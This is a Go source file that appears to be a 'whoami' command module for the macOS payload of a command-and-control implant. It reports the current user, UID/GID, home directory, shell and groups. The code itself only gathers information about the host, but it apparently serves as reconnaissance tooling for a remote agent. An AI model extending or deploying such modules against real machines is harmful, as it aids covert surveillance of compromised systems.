// server/docker/payloads/Darwin/action_whoami.go
//go:build darwin
// +build darwin

package main

import (
	"fmt"
	"os"
	"os/user"
	"strings"
	"time"
)

type WhoamiCommand struct{}

func (c *WhoamiCommand) Name() string {
	return "whoami"
}

func (c *WhoamiCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	var output strings.Builder

	// Default behavior for non-impersonated context
	currentUser, err := user.Current()
	if err != nil {
		// Fallback to environment variables
		username := c.getUsernameFromEnv()
		hostname := c.getHostname()
		if username != "" {
			output.WriteString(fmt.Sprintf("%s@%s", username, hostname))
		} else {
			output.WriteString(Err(E19))
		}
	} else {
		// Unix/Darwin format: username
		output.WriteString(currentUser.Username)

		// Add UID/GID info for verbose mode (compact format: v|uid|gid|home|shell)
		if len(args) > 0 && args[0] == "-v" {
			shell := os.Getenv(EnvShell())
			if shell == "" {
				shell = WUnknown
			}
			output.WriteString(fmt.Sprintf("\n%s|%s|%s|%s|%s", WVerbose, currentUser.Uid, currentUser.Gid, currentUser.HomeDir, shell))
		}
	}

	// Add groups info if requested (compact format: g|group1,group2,group3)
	if len(args) > 0 && args[0] == "-g" {
		if currentUser != nil {
			if groups, err := currentUser.GroupIds(); err == nil && len(groups) > 0 {
				output.WriteString(fmt.Sprintf("\n%s|%s", WGroups, strings.Join(groups, ",")))
			}
		}
	}

	return CommandResult{
		Output:      output.String(),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// getUsernameFromEnv tries to get username from environment variables
func (c *WhoamiCommand) getUsernameFromEnv() string {
	if username := os.Getenv(EnvUser()); username != "" {
		return username
	}
	if username := os.Getenv(EnvLogname()); username != "" {
		return username
	}
	return ""
}

// getHostname safely gets the hostname
func (c *WhoamiCommand) getHostname() string {
	hostname, err := os.Hostname()
	if err != nil {
		// Try environment variable
		if hostname := os.Getenv(EnvHostname()); hostname != "" {
			return hostname
		}
		return WUnknown
	}
	return hostname
}
